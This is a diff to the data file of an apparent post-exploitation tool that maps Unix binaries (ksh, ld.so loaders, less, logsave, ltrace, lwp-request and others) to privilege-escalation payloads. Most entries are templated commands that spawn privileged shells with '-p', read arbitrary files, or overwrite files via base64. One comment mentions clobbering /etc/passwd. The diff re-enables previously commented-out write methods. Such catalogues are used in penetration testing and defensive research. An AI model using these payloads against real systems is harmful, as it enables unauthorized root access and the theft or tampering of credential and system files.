@@ -363,16 +363,16 @@
 			"payload": "{command}",
 			// "suid" is not supplied because it must be very last argument
 			"args": ["-c", "\"{cat} {lfile}\"", "-b"]
-		}
+		},
 		// Using write, it doesn't get the entire text to clobber /etc/passwd
-		// {
-		// 	"type": "write",
-		// 	"stream": "base64",
-		// 	"payload": "{command}",
-		// 	"args": ["-c", "\"{base64} -d > {lfile}\"", "-b"],
-		// 	// "suid" is not supplied because it must be very last argument
-		// 	"exit": "{ctrl_d}"
-		// }
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{command}",
+			"args": ["-c", "\"{base64} -d > {lfile}\"", "-b"],
+			// "suid" is not supplied because it must be very last argument
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
 	],
 	"bsd-csh": [
 		{
@@ -389,16 +389,16 @@
 			"payload": "{command}",
 			// "suid" is not supplied because it must be very last argument
 			"args": ["-c", "\"{cat} {lfile}\"", "-b"]
-		}
+		},
 		// Using write, it doesn't get the entire text to clobber /etc/passwd
-		// {
-		// 	"type": "write",
-		// 	"stream": "base64",
-		// 	"payload": "{command}",
-		// 	"args": ["-c", "\"{base64} -d > {lfile}\"", "-b"],
-		// 	// "suid" is not supplied because it must be very last argument
-		// 	"exit": "{ctrl_d}"
-		// }
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{command}",
+			"args": ["-c", "\"{base64} -d > {lfile}\"", "-b"],
+			// "suid" is not supplied because it must be very last argument
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
 	],
 //-------------------------------------------------------------------
 	"curl": [
@@ -493,7 +493,7 @@
 	"easy_install": [
 		{
 			"type": "shell",
-			"payload": "TF=none; {command} -h; TF=$({mktemp} -d);echo \"import os; os.execl('{shell}', '{shell}', '-c', '{shell} -p <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py; {command} $TF",
+			"payload": "TF=none; {command} -h; TF=$({mktemp} -d);echo \"import os; os.execl('{shell}', '{shell}', '-c', '{shell} -p <$({tty}) >$({tty}) 2>$({tty})')\" > $TF/setup.py; {command} $TF",
 			"args": [],
 			"exit": "exit\n"
 		},
@@ -969,7 +969,7 @@
 		// This can file read and write as well... but it is Java.... so...
 		{
 			"type": "shell",
-			"payload": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('{shell} -pc \\$@|sh\\${{IFS}}-p _ echo {shell} -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | {command}",
+			"payload": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('{shell} -pc \\$@|sh\\${{IFS}}-p _ echo {shell} -p <$({tty}) >$({tty}) 2>$({tty})').waitFor()\" | {command}",
 			"args": [""]
 		}
 	],
@@ -997,11 +997,206 @@
 		{
 			"type": "shell",
 			"payload": "{command}",
-			"args": ["-e", "\"exec('/bin/sh -pc \\$@|sh\\${{IFS}}-p _ echo /bin/bash -p <$(tty) >$(tty) 2>$(tty)')\""]
+			"args": ["-e", "\"exec('/bin/sh -pc \\$@|sh\\${{IFS}}-p _ echo /bin/bash -p <$({tty}) >$({tty}) 2>$({tty})')\""]
 		}
 	],
-
-
+//-------------------------------------------------------------------
+	"ksh": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"suid": ["-p"],
+			"input": "{shell} -p\n",
+			// exit the shell, AND exit ksh
+			"exit": "exit\nexit\n"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-c", "\"{cat} {lfile}\""]
+		},
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{command}",
+			"args": ["-c", "\"{base64} -d > {lfile}\""],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+	],
+	"ksh93": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"suid": ["-p"],
+			"input": "{shell} -p\n",
+			// exit the shell, AND exit ksh
+			"exit": "exit\nexit\n"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-c", "\"{cat} {lfile}\""]
+		},
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{command}",
+			"args": ["-c", "\"{base64} -d > {lfile}\""],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+// `ksshell` could be impmemented for file read, but it corrupts 
+// each line with a prefix string (which we could fix), and lines are actually
+// parsed as kickstart scripts thus some file contents may lead to unexpected results.
+// It is not in my repositories, so I ignored it
+//-------------------------------------------------------------------
+	"ld-linux-x86-64.so.2": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}","-p"]
+		}
+	],
+	"ld-linux-x86-64.so.1": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}","-p"]
+		}
+	],
+	"ld-linux-x86.so.2": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}","-p"]
+		}
+	],
+	"ld-linux-x86.so.1": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}","-p"]
+		}
+	],
+	"ld-linux.so.1": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}","-p"]
+		}
+	],
+	"ld-linux.so.2": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}","-p"]
+		}
+	],
+	"ld.so.2": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}","-p"]
+		}
+	],
+	"ld.so.1": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}","-p"]
+		}
+	],
+	"ld.so": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}","-p"]
+		}
+	],
+	"ld-2.so": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}","-p"]
+		}
+	],
+	"ld-2.30.so": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}","-p"]
+		}
+	],
+//-------------------------------------------------------------------
+// ldconfig could be used with malicious libraries, but it might also
+// be dangerous. I have not implemented it.
+//-------------------------------------------------------------------
+	"less": [
+		{
+			"type": "shell",
+			"payload": "{command} /etc/profile",
+			"input": "!{shell} -p\n\n",
+			"exit": "exit\nq"
+		},
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} | {cat}",
+			"args": ["{lfile}"]
+		},
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{command} /etc/hosts; TF=$({mktemp} -u); {base64} -d > $TF; {command} < $TF; {rm} -f $TF",
+			"input" : "q",
+			"exit" : "{ctrl_d}{ctrl_d}s{lfile}\nq\n"
+		}
+	],
+//-------------------------------------------------------------------
+	"logsave": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["/dev/null", "{shell}", "-i", "-p", "-c", "\"exec {shell} -p <$({tty}) >$({tty}) 2>$({tty})\""]
+		}
+	],
+//-------------------------------------------------------------------
+	"look": [
+		{
+			"type": "read",
+			"stream" : "print",
+			"payload": "{command}",
+			"args": ["''", "{lfile}"]
+		},
+		{
+			"type": "read",
+			"stream" : "raw",
+			"payload": "{command} | {head} -c -1",
+			"args": ["''", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"ltrace": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-b", "-L", "{shell} -p"]
+		}
+	],
+//-------------------------------------------------------------------
+// TODO: put lua in ....
+//-------------------------------------------------------------------
+	"lwp-request": [
+		{
+			"type": "read",
+			"stream" : "raw",
+			"payload": "{command}",
+			"args": ["file://{lfile}"]
+		}
+	],
 
 
 
